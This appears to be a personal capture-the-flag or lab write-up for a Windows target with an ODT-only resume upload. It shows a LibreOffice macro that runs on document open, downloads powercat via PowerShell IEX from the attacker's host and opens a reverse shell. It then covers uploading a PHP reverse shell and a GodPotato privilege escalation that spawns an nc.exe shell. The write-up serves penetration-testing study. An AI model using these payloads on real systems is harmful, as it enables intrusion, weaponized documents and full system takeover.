box only has port 80 open
apache php, has a resume upload box, odt only

Thought of going for ntlm thefy, but nothing else to use that to login with
So, php rev shell is the only way to go

But no!
HINT TAKEN : gotta use libre office to create an odt, and add a macro that pulls powercat and gives reverse shell
`sudo apt-get install libreoffice-writer`

open libre office writer, write random text, then save it
tools -> macros -> organize macros -> basic.
Select your file -> new -> give the macro a name
```macro
Sub Main
Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.168/powercat.ps1');powercat -c 192.168.45.168 -p 1234 -e powershell")
End Sub
```
save the macro, save the doc

Go back to the file, tools-> customize 
under "Events" -> Select "Open Document". -> then "assign" macro --> select the macro we created
we get powercat into the cwd, upload the odt, get shell
cybergeek!

---
HINT TAKEN :  we need to switch to apache user, who is more likely to have an seImpersonate
To do so, we have writable c:\xampp\htdocs
Which means, we can upload a php reverse shell, as cybergeek, access it from kali, and be apache, and we do!
upload the windows-php-reverse.php to c:\xampp\htdocs
open it from kali
apache!

---
we do infact, have seImpersonate. so let the god potato do the work!
`.\gp.exe -cmd "C:\programdata\nc.exe -nv 192.168.45.168 1337 -e cmd.exe"`
root!